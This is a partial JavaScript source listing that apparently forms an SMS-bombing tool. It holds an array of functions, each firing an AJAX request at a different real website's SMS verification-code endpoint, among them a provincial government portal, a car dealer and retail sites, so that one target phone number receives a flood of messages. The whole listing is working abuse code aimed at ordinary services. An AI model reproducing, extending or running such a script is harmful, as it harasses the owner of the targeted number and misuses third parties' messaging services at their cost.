...
var requestList = [
    ...
    },
    {
        ...
        fn: function (phone) {
            $.ajax({
                ...
                type: "POST",
                data: {"target": phone,"action": "register","channel": "sms"},
                dataType: "json",
            })
        }
    },
    ...
    },
    {
        ...
        fn: function (phone) {
            $.ajax({
                url: "https://match.hetao101.com/contest-exam/userLogin/v1/code?mobile="+phone,
                type: "GET",
                data: {},
                dataType: "json",
            })
    ...
    },
    {
        ...
        fn: function (phone) {
            $.ajax({
                url: "https://openapi.00bang.cn/oauth/token/login/smsSendCode",
                type: "POST",
                data: {"mobile": phone,"userSessionId": "OAUTH_LOGIN_INFO_KEY_2594517363887756602be770062b0425d9add6bf2c728205f"},
                dataType: "json",
            })
        }
    },
...

    {
        ...
        fn: function (phone) {
            $.ajax({
                url: "http://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum="+phone,
                type: "GET",
                data: {},
                dataType: "json",
            })
    ...
    },
    {
        ...
        fn: function (phone) {
            $.ajax({
                url: "https://www.exeedcars.com/api/exeed/dealer/getPhoneCode?phone="+phone+"&verifyCode=0.81093210458354",
                type: "GET",
                data: {},
                dataType: "json",
            })
    ...
    },
    {
        ...
        fn: function (phone) {
            $.ajax({
                url: "https://elove.darryring.com/api/crm/newGwLogin/getSMSValidCode?phone="+phone+"&type=shop",
                type: "GET",
                data: {},
                dataType: "json",
            })
    ...
    },
    {
        ...
        fn: function (phone) {
            $.ajax({
                url: "https://yae920.com/login/sendSMS",
                type: "POST",
                data: {"mobile":phone,"smsType":"02","timestamp":"1651060693706"},
                dataType: "json",
            })
        }
    },
    ...
    },
    {
        ...
        fn: function (phone) {
            $.ajax({
                ...
                type: "POST",
                data: {"type": "login", "mobile": phone, "mobile_area_code": "86"},
                dataType: "json",
            })
        }
    },
    {
        ...
        fn: function (phone) {
            $.ajax({
                url: "https://mall.yancais.com/pc/login/login",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
